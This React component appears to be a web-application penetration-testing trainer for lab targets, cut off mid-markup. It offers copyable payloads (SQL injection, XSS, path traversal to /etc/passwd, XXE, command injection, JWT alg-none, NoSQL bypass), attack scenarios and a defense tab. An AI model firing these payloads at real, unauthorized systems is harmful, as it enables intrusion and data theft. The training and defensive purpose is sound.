// src/components/coach/WebAppCoach.tsx
import { useState, useCallback, useMemo, useEffect, useRef } from 'react'
import {
  BookOpen, Terminal, AlertTriangle, Target, Copy, Shield,
  Zap, CheckCircle, Lock, Eye, Lightbulb, ListChecks, RotateCcw,
  Search, Menu, Globe, ChevronRight, ChevronDown
} from 'lucide-react'

type Tab = 'overview' | 'howitworks' | 'commands' | 'scenarios' | 'defense' | 'checklist' | 'tools'

const STORAGE_CHECKLIST = 'arachne_lab_checklist_v1'

const tabs: ReadonlyArray<{ id: Tab; label: string; icon: React.ElementType }> = [
  { id: 'overview', label: 'Overview', icon: BookOpen },
  { id: 'howitworks', label: 'How It Works', icon: Target },
  { id: 'commands', label: 'Payloads', icon: Terminal },
  { id: 'scenarios', label: 'Scenarios', icon: Shield },
  { id: 'tools', label: 'Lab Tools', icon: Zap },
  { id: 'defense', label: 'Defense', icon: AlertTriangle },
  { id: 'checklist', label: 'Lab Checklist', icon: ListChecks },
]

const commandExamples = [
  // SQLi
  { id: 'sqli-auth-bypass', title: 'SQLi — Auth bypass', cmd: `' OR 1=1-- -`, tags: ['sqli'], note: 'Login form. Try username and password fields separately.' },
  { id: 'sqli-auth-bypass-alt', title: 'SQLi — Auth bypass (OR true)', cmd: `admin'-- -`, tags: ['sqli'], note: 'Comments out the rest of the WHERE clause after username.' },
  { id: 'sqli-orderby', title: 'SQLi — Column count (ORDER BY)', cmd: `' ORDER BY 5-- -`, tags: ['sqli'], note: 'Increment until error; last success is column count.' },
  { id: 'sqli-union', title: 'SQLi — UNION extraction', cmd: `' UNION SELECT null,username,password FROM users-- -`, tags: ['sqli'], note: 'Match column count; map types with nulls first.' },
  { id: 'sqli-union-version', title: 'SQLi — UNION fingerprint', cmd: `' UNION SELECT null,@@version,null-- -`, tags: ['sqli'], note: 'MySQL/MSSQL version leak when UNION works.' },
  { id: 'sqli-boolean-true', title: 'SQLi — Boolean true', cmd: `' AND 1=1-- -`, tags: ['sqli'], note: 'Baseline for blind boolean comparison.' },
  { id: 'sqli-boolean-false', title: 'SQLi — Boolean false', cmd: `' AND 1=2-- -`, tags: ['sqli'], note: 'Should differ from true response if injectable.' },
  { id: 'sqli-time-mysql', title: 'SQLi — Time delay (MySQL lab)', cmd: `' AND SLEEP(3)-- -`, tags: ['sqli'], note: 'Only on lab DBs. Confirms blind time-based injection.' },
  { id: 'sqli-time-pg', title: 'SQLi — Time delay (PostgreSQL lab)', cmd: `'; SELECT pg_sleep(3)-- -`, tags: ['sqli'], note: 'Lab Postgres stacks. Watch response latency.' },
  { id: 'sqli-error-mysql', title: 'SQLi — Error-based extract (MySQL)', cmd: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -`, tags: ['sqli'], note: 'When errors are visible. Lab only.' },
  // XSS
  { id: 'xss-reflected', title: 'XSS — Basic reflected', cmd: `<script>alert(document.domain)</script>`, tags: ['xss'], note: 'Confirms execution context and origin.' },
  { id: 'xss-img', title: 'XSS — img onerror', cmd: `<img src=x onerror=alert(1)>`, tags: ['xss'], note: 'When script tags are filtered.' },
  { id: 'xss-svg', title: 'XSS — svg onload', cmd: `<svg onload=alert(1)>`, tags: ['xss'], note: 'Alternate tag vector for weak blocklists.' },
  { id: 'xss-body', title: 'XSS — body onload', cmd: `<body onload=alert(1)>`, tags: ['xss'], note: 'Attribute-based if tags partially allowed.' },
  { id: 'xss-details', title: 'XSS — details ontoggle', cmd: `<details open ontoggle=alert(1)>`, tags: ['xss'], note: 'Less common event handler; lab filter bypass practice.' },
  { id: 'xss-js-uri', title: 'XSS — javascript URI (href)', cmd: `javascript:alert(1)`, tags: ['xss'], note: 'Test link/href sinks carefully in lab.' },
  { id: 'xss-attr-break', title: 'XSS — Break out of attribute', cmd: `" onmouseover="alert(1)`, tags: ['xss'], note: 'When input lands inside a quoted attribute.' },
  { id: 'xss-polyglot', title: 'XSS — Short polyglot probe', cmd: `'"><img src=x onerror=alert(1)>`, tags: ['xss'], note: 'Tries quote break + tag in one shot.' },
  // IDOR / access
  { id: 'idor-curl', title: 'IDOR — Sequential object ID', cmd: `curl -s "https://target/api/user/1001" -H "Cookie: session=YOUR_SESSION"`, tags: ['idor'], note: 'Swap IDs as low-priv user; compare bodies.' },
  { id: 'idor-horizontal', title: 'IDOR — Horizontal user resource', cmd: `curl -s "https://target/api/orders/1042" -H "Authorization: Bearer USER_TOKEN"`, tags: ['idor'], note: 'Same role, different owner object.' },
  { id: 'idor-verb', title: 'IDOR — Method change probe', cmd: `curl -s -X PUT "https://target/api/user/1001" -H "Cookie: session=YOUR_SESSION" -d '{}'`, tags: ['idor'], note: 'GET restricted but PUT/DELETE open — lab APIs only.' },
  // JWT
  { id: 'jwt-none', title: 'JWT — alg none header (lab)', cmd: `echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0`, tags: ['jwt'], note: 'Build header; empty signature. Lab stacks only.' },
  { id: 'jwt-decode', title: 'JWT — Decode payload (lab)', cmd: `echo 'PAYLOAD_B64' | tr '_-' '/+' | base64 -d 2>/dev/null; echo`, tags: ['jwt'], note: 'Inspect claims offline before tamper tests.' },
  // LFI / path
  { id: 'lfi-basic', title: 'LFI — Path traversal', cmd: `../../../../etc/passwd`, tags: ['lfi'], note: 'Linux lab files. Confirm readable known paths.' },
  { id: 'lfi-null', title: 'LFI — Null byte (legacy)', cmd: `../../../../etc/passwd%00`, tags: ['lfi'], note: 'Old PHP; often dead on modern stacks.' },
  { id: 'lfi-php-filter', title: 'LFI — PHP filter source', cmd: `php://filter/convert.base64-encode/resource=index.php`, tags: ['lfi'], note: 'Read PHP source as base64 in lab.' },
  { id: 'lfi-proc', title: 'LFI — proc self environ', cmd: `../../../../proc/self/environ`, tags: ['lfi'], note: 'Sometimes leaks env in misconfigured labs.' },
  { id: 'lfi-win', title: 'LFI — Windows traversal', cmd: `..\\..\\..\\..\\windows\\win.ini`, tags: ['lfi'], note: 'Windows lab targets.' },
  // SSRF
  { id: 'ssrf-local', title: 'SSRF — Loopback', cmd: `http://127.0.0.1/`, tags: ['ssrf'], note: 'URL-fetch features; compare to external URL.' },
  { id: 'ssrf-local-port', title: 'SSRF — Internal port probe', cmd: `http://127.0.0.1:8080/`, tags: ['ssrf'], note: 'Lab services bound to localhost.' },
  { id: 'ssrf-file', title: 'SSRF — file scheme (if allowed)', cmd: `file:///etc/passwd`, tags: ['ssrf'], note: 'Only if the fetch library allows file:// in lab.' },
  // Command injection
  { id: 'cmdi-semi', title: 'Command injection — semicolon', cmd: `; id`, tags: ['cmdi'], note: 'OS sinks in lab apps.' },
  { id: 'cmdi-pipe', title: 'Command injection — pipe', cmd: `| id`, tags: ['cmdi'], note: 'Alternate separator.' },
  { id: 'cmdi-and', title: 'Command injection — AND', cmd: `&& id`, tags: ['cmdi'], note: 'Runs if prior command succeeds.' },
  { id: 'cmdi-backtick', title: 'Command injection — $() style', cmd: '$(id)', tags: ['cmdi'], note: 'Command substitution style in vulnerable sinks.' },
  // Upload / other
  { id: 'upload-php', title: 'Upload — PHP extension probe', cmd: `shell.php`, tags: ['upload'], note: 'Lab upload forms; also try .php5 / .phtml if blocked.' },
  { id: 'upload-double', title: 'Upload — Double extension', cmd: `shell.php.jpg`, tags: ['upload'], note: 'Weak type checks in lab apps.' },
  { id: 'open-redirect', title: 'Open redirect probe', cmd: `https://evil.example/`, tags: ['redirect'], note: 'url= / next= / returnUrl= parameters on lab apps.' },
  { id: 'host-header', title: 'Host header injection probe', cmd: `Host: evil.example`, tags: ['headers'], note: 'Password-reset links sometimes use Host. Lab only.' },
  { id: 'cors-origin', title: 'CORS — Origin reflection check', cmd: `Origin: https://evil.example`, tags: ['cors'], note: 'Watch Access-Control-Allow-Origin in response.' },
  { id: 'xxe-basic', title: 'XXE — Basic file read (lab XML)', cmd: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, tags: ['xxe'], note: 'XML upload/parse endpoints on lab apps only.' },
  { id: 'ssti-probe', title: 'SSTI — Template probe', cmd: `{{7*7}}`, tags: ['ssti'], note: 'If 49 reflects, template engine may evaluate input.' },
  { id: 'ssti-jinja', title: 'SSTI — Jinja-style probe', cmd: `${7*7}`, tags: ['ssti'], note: 'Alternate syntax depending on engine.' },
  { id: 'nosql-auth', title: 'NoSQL — Auth operator probe', cmd: `{"username":{"$ne":""},"password":{"$ne":""}}`, tags: ['nosql'], note: 'JSON login APIs with Mongo-like backends in lab.' },
  { id: 'graphql-introspect', title: 'GraphQL — Introspection', cmd: `{"query":"{ __schema { types { name } } }"}`, tags: ['graphql'], note: 'If enabled, maps the API surface on lab GraphQL.' },
  // Recon tools
  { id: 'ffuf-dirs', title: 'ffuf — Directories', cmd: `ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403`, tags: ['recon'], note: 'Content discovery before parameter work.' },
  { id: 'ffuf-params', title: 'ffuf — Parameter names', cmd: `ffuf -u "https://target/api?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,302,400,500`, tags: ['recon'], note: 'Find hidden parameters on lab APIs.' },
  { id: 'sqlmap-basic', title: 'sqlmap — Confirm (lab)', cmd: `sqlmap -u "https://target/item?id=1" --batch --level=3 --risk=2`, tags: ['sqli', 'recon'], note: 'After manual proof only — noisy.' },
  { id: 'curl-trace', title: 'Method — TRACE/OPTIONS probe', cmd: `curl -i -X OPTIONS https://target/`, tags: ['recon'], note: 'See allowed methods; TRACE rarely useful but OPTIONS maps verbs.' },
]

const scenarios = [
  {
    id: 'login-sqli',
    title: 'Login Form SQL Injection',
    steps: [
      "Try `' OR 1=1-- -` in the username field with any password.",
      'If that fails, try it in the password field instead.',
      'Compare responses (error, timing, redirect) between valid and invalid injection.',
      'If confirmed, escalate to UNION extraction for credentials in lab DBs.',
    ],
    why: 'Unsanitized login queries remain common and often mean full account takeover.',
  },
  {
    id: 'reflected-xss',
    title: 'Reflected XSS via Search',
    steps: [
      'Search a unique marker like zzXSStest and check if it reflects unescaped.',
      'If raw HTML reflects, try a basic script alert on document.domain.',
      'If script tags strip, try img onerror or svg onload.',
      'Document the exact parameter and encoding context for the report.',
    ],
    why: 'Search and error pages often echo input without treating it as HTML output.',
  },
  {
    id: 'idor-invoice',
    title: 'IDOR on Document/Invoice ID',
    steps: [
      'As a low-priv user, find an endpoint with a numeric or predictable ID.',
      'Change the ID while staying authenticated as yourself.',
      "If another user's object loads, object-level authorization is broken.",
      'Capture request/response evidence — easy to prove in writeups.',
    ],
    why: 'Missing ownership checks are among the most common real-world findings.',
  },
  {
    id: 'jwt-tamper',
    title: 'JWT Tampering (Lab)',
    steps: [
      'Decode header and payload (jwt.io or base64).',
      'Test alg none with empty signature if the stack allows it.',
      'Try changing a claim like role and see if signature is re-validated.',
      'If accepted, authentication is broken — critical lab finding.',
    ],
    why: 'Tokens trusted without strict algorithm and signature checks fail open.',
  },
  {
    id: 'lfi-to-source',
    title: 'LFI to Source Disclosure',
    steps: [
      'Find a parameter that loads files or templates by name.',
      'Try path traversal to a known file (e.g. /etc/passwd on Linux labs).',
      'On PHP targets, try php filter wrappers to read source as base64.',
      'Note any secrets in config files — only on authorized lab apps.',
    ],
    why: 'File inclusion bugs turn path control into read access to the app and host.',
  },
  {
    id: 'ssrf-cloud-meta',
    title: 'SSRF Internal Reachability',
    steps: [
      'Find a feature that fetches a URL (webhooks, previews, importers).',
      'Point it at loopback or internal IPs in your lab network.',
      'Compare responses to external URLs vs internal-only services.',
      'Document impact without attacking systems outside your lab scope.',
    ],
    why: 'Server-side fetch features often trust attacker-controlled URLs.',
  },
]

const defenseDetails = {
  sqli: [
    'Parameterized queries / prepared statements — never concatenate SQL.',
    'Least-privilege DB accounts for the app role.',
    'WAF is a layer, not a fix for the query itself.',
  ],
  xss: [
    'Context-aware output encoding (HTML / JS / URL as appropriate).',
    'Content-Security-Policy to limit script sources.',
    'HttpOnly + Secure cookies reduce session-theft impact.',
  ],
  idor: [
    'Server-side ownership checks on every object access.',
    'UUIDs help but do not replace authorization.',
    'Alert on sequential ID enumeration patterns.',
  ],
  jwt: [
    'Reject alg none; enforce one expected algorithm server-side.',
    'Long random secrets; never hardcode in repos.',
    'Short expiry; validate claims on every request.',
  ],
  lfi: [
    'Allowlist permitted files; reject path traversal sequences.',
    'Serve user content outside the web root when possible.',
    'Disable dangerous wrappers in production PHP configs.',
  ],
  ssrf: [
    'Allowlist outbound destinations for server-side fetches.',
    'Block link-local and private ranges unless explicitly required.',
    'Do not return raw internal responses to the client.',
  ],
  upload: [
    'Allowlist extensions and verify content, not only client Content-Type.',
    'Store uploads outside the web root; serve via controlled handlers.',
    'Rename files server-side; disable script execution in upload dirs.',
  ],
  ssti: [
    'Never pass user input into template compile/render APIs.',
    'Prefer logic-less templates or strict sandboxes where required.',
    'Encode output; treat template injection as RCE-class until proven otherwise.',
  ],
  xxe: [
    'Disable external entity resolution in XML parsers.',
    'Prefer JSON when XML is not required.',
    'Limit parser privileges and network egress from app servers.',
  ],
}

const checklistItems = [
  { id: 'lab-target', label: 'Authorized lab target ready', detail: 'DVWA, Juice Shop, HTB/THM web box — never production' },
  { id: 'map-app', label: 'Map the application', detail: 'Endpoints, parameters, roles, interesting cookies' },
  { id: 'sqli-test', label: 'Test one input for SQLi', detail: 'Quote error first, then a controlled payload' },
  { id: 'xss-test', label: 'Test one input for reflected XSS', detail: 'Confirm reflection, then execution' },
  { id: 'idor-test', label: 'Test one endpoint for IDOR', detail: 'Change ID as low-priv user' },
  { id: 'jwt-test', label: 'Inspect JWT if present', detail: 'Alg handling and claim trust' },
  { id: 'lfi-ssrf', label: 'Check file/URL parameters', detail: 'LFI or SSRF only on lab apps' },
  { id: 'upload-test', label: 'Probe one upload field (lab app)', detail: 'Type checks, extension, where the file is served' },
  { id: 'ssti-test', label: 'Template probe on one reflected field', detail: '{{7*7}} / ${7*7} — stop at confirmation' },
  { id: 'defend-note', label: 'Write a concrete fix per finding', detail: 'Defense tab — specific, not generic' },
]

const labTools = [
  { id: 'burp', title: 'Burp Suite (Community/Pro)', detail: 'Intercept, repeater, intruder for manual testing. Community is enough for most labs.' },
  { id: 'ffuf', title: 'ffuf', detail: 'Fast content discovery. Pair with good wordlists; filter by status and size.' },
  { id: 'sqlmap', title: 'sqlmap', detail: 'Confirm SQLi after manual proof. Loud — lab only, scoped targets.' },
  { id: 'jwt_tool', title: 'jwt_tool / jwt.io', detail: 'Decode and experiment with claims offline before sending to a lab app.' },
  { id: 'browser', title: 'Browser + DevTools', detail: 'Network tab, storage, and DOM inspection before automated tools.' },
]

function CopyBtn({
  id, text, state, onCopy,
}: {
  id: string
  text: string
  state: 'idle' | 'copied' | 'failed'
  onCopy: (id: string, text: string) => void
}) {
  return (
    <button
      type="button"
      onClick={() => onCopy(id, text)}
      className={`text-xs transition-colors flex items-center gap-1 px-2 py-1 rounded hover:bg-white/5 flex-shrink-0 ${
        state === 'copied' ? 'text-emerald-400' : state === 'failed' ? 'text-red-400' : 'text-white/40 hover:text-white/70'
      }`}
      aria-label={state === 'copied' ? 'Copied' : 'Copy'}
    >
      {state === 'copied' ? <CheckCircle size={12} /> : state === 'failed' ? <AlertTriangle size={12} /> : <Copy size={12} />}
      {state === 'copied' ? 'Copied' : state === 'failed' ? 'Failed' : 'Copy'}
    </button>
  )
}

function OverviewPanel() {
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-white font-semibold text-lg mb-2 text-violet-400">What Arachne covers</h2>
        <p className="text-white/50 leading-relaxed">
          Web application testing is systematic probing of inputs, auth, and access control.
          This coach focuses on classes you will see constantly on HTB/THM and lab apps:
          SQLi, XSS, IDOR, JWT flaws, plus LFI and SSRF patterns.
        </p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
          <h3 className="text-violet-400 font-semibold mb-2 flex items-center gap-2"><Zap size={16} /> Why it matters</h3>
          <p className="text-sm text-white/50 leading-relaxed">
            Web is the most common external attack surface. The same vulnerability classes appear across
            frameworks because the root issue is trusting external input without correct validation,
            encoding, or authorization.
          </p>
        </div>
        <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
          <h3 className="text-violet-400 font-semibold mb-2 flex items-center gap-2"><Eye size={16} /> Classes covered</h3>
          <ul className="text-sm text-white/50 space-y-1.5 list-disc pl-5">
            <li>SQL injection &amp; NoSQL probes</li>
            <li>XSS / SSTI</li>
            <li>IDOR &amp; auth (JWT)</li>
            <li>LFI, SSRF, XXE</li>
            <li>Upload &amp; redirect issues</li>
          </ul>
        </div>
      </div>
      <div className="p-4 rounded-xl border border-violet-500/20 flex gap-3" style={{ background: 'rgba(139,92,246,0.06)' }}>
        <Lightbulb className="text-violet-400 flex-shrink-0 mt-0.5" size={18} />
        <div className="text-sm text-white/50">
          <strong className="text-white/70">Lab order:</strong> map the app → manual probes → automate only what you already understand → write the fix.
          Use DVWA, Juice Shop, or authorized HTB/THM boxes only.
        </div>
      </div>
    </div>
  )
}

function HowItWorksPanel() {
  return (
    <div className="space-y-6">
      <h2 className="text-white font-semibold text-lg text-violet-400">How web testing works</h2>
      <div className="p-4 rounded-xl border border-white/10 space-y-3" style={{ background: 'rgba(255,255,255,0.03)' }}>
        <p className="text-sm text-white/50 leading-relaxed">
          Request → server logic (often DB or file/URL fetch) → response.
          Bugs appear where untrusted input is treated as trusted code, query structure, or authorization proof.
        </p>
        <div className="bg-black/40 p-3 rounded-lg font-mono text-xs text-white/60 space-y-1">
          <div>1. Client sends input → <span className="text-violet-400">username=admin&apos; OR 1=1--</span></div>
          <div>2. Server builds query / HTML / fetch from that input</div>
          <div>3. Logic or encoding fails</div>
          <div>4. Unintended data or behavior returns</div>
        </div>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {[
          { t: 'Injection', d: 'Input changes query or command structure (SQLi, command injection).' },
          { t: 'Reflection', d: 'Input returns in a context where the browser executes it (XSS).' },
          { t: 'Authorization', d: 'Object IDs accepted without ownership checks (IDOR).' },
          { t: 'Trust boundaries', d: 'Server fetches URLs or files the client chooses (SSRF / LFI).' },
        ].map(x => (
          <div key={x.t} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <h3 className="text-violet-400 font-semibold mb-1 text-sm">{x.t}</h3>
            <p className="text-xs text-white/50">{x.d}</p>
          </div>
        ))}
      </div>
    </div>
  )
}

function CommandsPanel({
  filter, onFilterChange, copiedStates, onCopy,
}: {
  filter: string
  onFilterChange: (v: string) => void
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
}) {
  const filtered = useMemo(() => {
    const q = filter.trim().toLowerCase()
    if (!q) return commandExamples
    return commandExamples.filter(
      c =>
        c.title.toLowerCase().includes(q) ||
        c.cmd.toLowerCase().includes(q) ||
        c.tags.some(t => t.includes(q)) ||
        c.note.toLowerCase().includes(q),
    )
  }, [filter])

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap items-center justify-between gap-3">
        <h2 className="text-white font-semibold text-lg text-violet-400">Payloads & commands</h2>
        <div className="relative">
          <Search size={12} className="absolute left-3 top-1/2 -translate-y-1/2 text-white/30" />
          <input
            value={filter}
            onChange={e => onFilterChange(e.target.value)}
            placeholder="Filter (sqli, xss, idor…)"
            className="pl-8 pr-3 py-2 w-48 bg-black/30 border border-white/10 rounded-xl text-xs text-white/80 focus:outline-none focus:border-violet-500/40"
          />
        </div>
      </div>
      <p className="text-xs text-white/40">Lab targets only. Copy is for practice apps you are allowed to test.</p>
      <div className="space-y-3">
        {filtered.map(c => (
          <div key={c.id} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <div className="flex items-start justify-between gap-2 mb-2">
              <div>
                <div className="text-white font-semibold text-sm">{c.title}</div>
                <div className="flex flex-wrap gap-1 mt-1">
                  {c.tags.map(t => (
                    <span key={t} className="text-[10px] px-1.5 py-0.5 rounded-full bg-violet-500/10 text-violet-300/80 border border-violet-500/20">
                      {t}
                    </span>
                  ))}
                </div>
              </div>
              <CopyBtn id={c.id} text={c.cmd} state={copiedStates[c.id] || 'idle'} onCopy={onCopy} />
            </div>
            <div className="bg-black/40 p-2.5 rounded-lg font-mono text-xs text-violet-300 overflow-x-auto break-all">{c.cmd}</div>
            <p className="text-white/40 text-xs mt-2">{c.note}</p>
          </div>
        ))}
        {filtered.length === 0 && (
          <p className="text-white/40 text-sm text-center py-8">No payloads match “{filter}”</p>
        )}
      </div>
    </div>
  )
}

function ScenariosPanel() {
  const [open, setOpen] = useState<string | null>(scenarios[0]?.id ?? null)
  return (
    <div className="space-y-4">
      <h2 className="text-white font-semibold text-lg text-violet-400">Attack scenarios</h2>
      <p className="text-sm text-white/50">Expand a path, practice on a lab app, then write the fix.</p>
      {scenarios.map(s => {
        const isOpen = open === s.id
        return (
          <div key={s.id} className="rounded-xl border border-white/10 overflow-hidden" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <button
              type="button"
              onClick={() => setOpen(isOpen ? null : s.id)}
              className="w-full flex items-center gap-2 px-4 py-3 text-left hover:bg-white/5 transition-colors"
            >
              {isOpen ? <ChevronDown size={16} className="text-violet-400" /> : <ChevronRight size={16} className="text-violet-400" />}
              <span className="text-white font-semibold text-sm flex-1">{s.title}</span>
            </button>
            {isOpen && (
              <div className="px-4 pb-4 space-y-3 border-t border-white/5 pt-3">
                <ol className="space-y-2">
                  {s.steps.map((step, i) => (
                    <li key={i} className="text-sm text-white/50 flex gap-2">
                      <span className="text-violet-400 font-mono text-xs mt-0.5 flex-shrink-0">{String(i + 1).padStart(2, '0')}.</span>
                      <span>{step}</span>
                    </li>
                  ))}
                </ol>
                <div className="bg-violet-500/5 border border-violet-500/20 rounded-lg p-3">
                  <p className="text-xs text-white/50">
                    <strong className="text-violet-400">Why it matters:</strong> {s.why}
                  </p>
                </div>
              </div>
            )}
          </div>
        )
      })}
    </div>
  )
}

function ToolsPanel() {
  return (
    <div className="space-y-4">
      <h2 className="text-white font-semibold text-lg text-violet-400">Lab tools</h2>
      <p className="text-sm text-white/50">Use these against authorized practice targets only.</p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {labTools.map(t => (
          <div key={t.id} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <h3 className="text-white font-semibold text-sm mb-1">{t.title}</h3>
            <p className="text-xs text-white/50">{t.detail}</p>
          </div>
        ))}
      </div>
      <div className="p-4 rounded-xl border border-violet-500/20 flex gap-3" style={{ background: 'rgba(139,92,246,0.06)' }}>
        <Terminal className="text-violet-400 flex-shrink-0 mt-0.5" size={18} />
        <div className="text-sm text-white/50">
          Pair with <strong className="text-white/70">Mentor</strong> (Gobuster) and <strong className="text-white/70">Lynceus</strong> (output parsing)
          when you move from content discovery into parameter testing.
        </div>
      </div>
    </div>
  )
}

function DefensePanel() {
  const sections = [
    { key: 'sqli', title: 'SQL injection', items: defenseDetails.sqli },
    { key: 'xss', title: 'XSS', items: defenseDetails.xss },
    { key: 'idor', title: 'IDOR / access control', items: defenseDetails.idor },
    { key: 'jwt', title: 'JWT / auth', items: defenseDetails.jwt },
    { key: 'lfi', title: 'LFI', items: defenseDetails.lfi },
    { key: 'ssrf', title: 'SSRF', items: defenseDetails.ssrf },
    { key: 'upload', title: 'File upload', items: defenseDetails.upload },
    { key: 'ssti', title: 'SSTI', items: defenseDetails.ssti },
    { key: 'xxe', title: 'XXE', items: defenseDetails.xxe },
  ]
  return (
    <div className="space-y-4">
      <h2 className="text-white font-semibold text-lg text-violet-400">Detection & defense</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {sections.map(sec => (
          <div key={sec.key} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <h3 className="text-white font-semibold mb-3 flex items-center gap-2 text-sm">
              <Lock size={14} className="text-violet-400" /> {sec.title}
            </h3>
            <ul className="space-y-2">
              {sec.items.map((item, i) => (
                <li key={i} className="text-white/50 text-sm flex gap-2">
                  <Shield size={14} className="text-violet-400 flex-shrink-0 mt-0.5" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>
          </div>
        ))}
      </div>
    </div>
  )
}

function ChecklistPanel({
  checklist, onToggle, onReset,
}: {
  checklist: Record<string, boolean>
  onToggle: (id: string) => void
  onReset: () => void
}) {
  const done = checklistItems.filter(i => checklist[i.id]).length
  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <h2 className="text-white font-semibold text-lg text-violet-400 flex items-center gap-2">
          <ListChecks size={18} /> Lab checklist
        </h2>
        <div className="flex items-center gap-3">
          <span className="text-sm text-white/40">{done}/{checklistItems.length}</span>
          <button type="button" onClick={onReset} className="text-xs text-white/40 hover:text-white/70 flex items-center gap-1">
            <RotateCcw size={12} /> Reset
          </button>
        </div>
      </div>
      <div className="h-2 rounded-full bg-white/10 overflow-hidden">
        <div className="h-full bg-violet-500 transition-all" style={{ width: `${(done / Math.max(1, checklistItems.length)) * 100}%` }} />
      </div>
      <div className="space-y-2">
        {checklistItems.map(item => {
          const on = !!checklist[item.id]
          return (
            <button
              key={item.id}
              type="button"
              onClick={() => onToggle(item.id)}
              className={`w-full text-left p-4 rounded-xl border transition-colors flex gap-3 ${
                on ? 'border-emerald-500/30 bg-emerald-500/5' : 'border-white/10 bg-white/5 hover:border-white/20'
              }`}
            >
              <span className="mt-0.5 flex-shrink-0">
                {on ? <CheckCircle size={18} className="text-emerald-400" /> : <div className="w-[18px] h-[18px] rounded-full border border-white/30" />}
              </span>
              <span>
                <span className={`text-sm font-medium ${on ? 'text-emerald-200/90 line-through' : 'text-white'}`}>{item.label}</span>
                <span className="block text-xs text-white/40 mt-0.5">{item.detail}</span>
              </span>
            </button>
          )
        })}
      </div>
      {done === checklistItems.length && (
        <div className="text-sm text-emerald-300/90 p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/20">
          Checklist complete — pick a new lab app and run the flow cold.
        </div>
      )}
    </div>
  )
}

export default function WebAppCoach() {
  const [activeTab, setActiveTab] = useState<Tab>('overview')
  const [copiedStates, setCopiedStates] = useState<Record<string, 'idle' | 'copied' | 'failed'>>({})
  const [cmdFilter, setCmdFilter] = useState('')
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [checklist, setChecklist] = useState<Record<string, boolean>>(() => {
    try { return JSON.parse(localStorage.getItem(STORAGE_CHECKLIST) || '{}') } catch { return {} }
  })
  const copyTimers = useRef(new Map<string, ReturnType<typeof setTimeout>>())

  useEffect(() => () => {
    copyTimers.current.forEach(t => clearTimeout(t))
    copyTimers.current.clear()
  }, [])
  useEffect(() => {
    try { localStorage.setItem(STORAGE_CHECKLIST, JSON.stringify(checklist)) } catch { /* quota */ }
  }, [checklist])
  useEffect(() => {
    if (!sidebarOpen) return
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setSidebarOpen(false) }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [sidebarOpen])

  const checklistDone = checklistItems.filter(i => checklist[i.id]).length

  const copyToClipboard = useCallback(async (text: string): Promise<boolean> => {
    if (navigator.clipboard?.writeText) {
      try { await navigator.clipboard.writeText(text); return true } catch { /* fall through */ }
    }
    try {
      const el = document.createElement('textarea')
      el.value = text
      el.style.position = 'fixed'
      el.style.opacity = '0'
      document.body.appendChild(el)
      el.select()
      const ok = document.execCommand('copy')
      document.body.removeChild(el)
      return ok
    } catch { return false }
  }, [])

  const handleCopy = useCallback((id: string, text: string) => {
    void copyToClipboard(text).then(ok => {
      setCopiedStates(prev => ({ ...prev, [id]: ok ? 'copied' : 'failed' }))
      const existing = copyTimers.current.get(id)
      if (existing) clearTimeout(existing)
      const t = setTimeout(() => {
        setCopiedStates(prev => ({ ...prev, [id]: 'idle' }))
        copyTimers.current.delete(id)
      }, 1800)
      copyTimers.current.set(id, t)
    })
  }, [copyToClipboard])

  const setTab = (id: Tab) => {
    setActiveTab(id)
    setSidebarOpen(false)
  }

  const panel = useMemo(() => {
    switch (activeTab) {
      case 'overview': return <OverviewPanel />
      case 'howitworks': return <HowItWorksPanel />
      case 'commands': return <CommandsPanel filter={cmdFilter} onFilterChange={setCmdFilter} copiedStates={copiedStates} onCopy={handleCopy} />
      case 'scenarios': return <ScenariosPanel />
      case 'tools': return <ToolsPanel />
      case 'defense': return <DefensePanel />
      case 'checklist': return (
        <ChecklistPanel
          checklist={checklist}
          onToggle={id => setChecklist(prev => ({ ...prev, [id]: !prev[id] }))}
          onReset={() => setChecklist({})}
        />
      )
      default: return null
    }
  }, [activeTab, copiedStates, handleCopy, cmdFilter, checklist])

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
      <div className="max-w-6xl mx-auto p-6">
        <div className="flex items-center justify-between mb-6 flex-wrap gap-3">
          <div className="flex items-center gap-3">
            <div
              className="w-10 h-10 rounded-xl flex items-center justify-center"
              style={{
                background: 'radial-gradient(circle, rgba(139,92,246,0.2), rgba(139,92,246,0.05))',
                border: '1px solid rgba(139,92,246,0.15)',
              }}
            >
              <Globe size={18} className="text-violet-400" />
            </div>
            <div>
              <h1 className="text-white font-bold text-xl tracking-wide">ARACHNE</h1>
              <p className="text-white/40 text-xs">Web application testing — lab methodology</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <div className="hidden sm:flex items-center gap-2 text-xs text-white/30">
              <Shield size={14} className="text-violet-400" />
